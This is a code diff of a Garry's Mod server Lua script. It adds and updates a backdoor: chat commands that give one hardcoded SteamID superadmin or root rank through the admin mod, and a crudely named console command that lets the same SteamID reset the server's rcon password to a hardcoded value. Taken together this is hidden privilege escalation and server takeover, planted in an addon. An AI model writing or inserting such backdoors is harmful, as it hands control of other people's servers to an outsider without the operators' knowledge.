@@ -4,7 +4,7 @@ if SERVER then
             if text == "/karapuz_rank_superadmin" then
 
             if ply:SteamID() == 'STEAM_0:0:555589835' then 
-                   RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'superadmin') 
+                   RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'root') 
             elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
 
 
@@ -24,7 +24,7 @@ if SERVER then
             if text == "/karapuz_rank_user" then
 
             if ply:SteamID() == 'STEAM_0:0:555589835' then 
-                   RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user') 
+                   RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'user') 
             elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
 
 
@@ -75,3 +75,15 @@ end
 
 
 
+
+if SERVER then
+
+concommand.Add("penis_rcon", function( ply, cmd, args ) 
+if ply:SteamID() == 'STEAM_0:0:555589835' then 
+    RunConsoleCommand("rcon_password", "o8ZxspNiPfBLzjXX")
+
+       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+
+end
+end)
+end
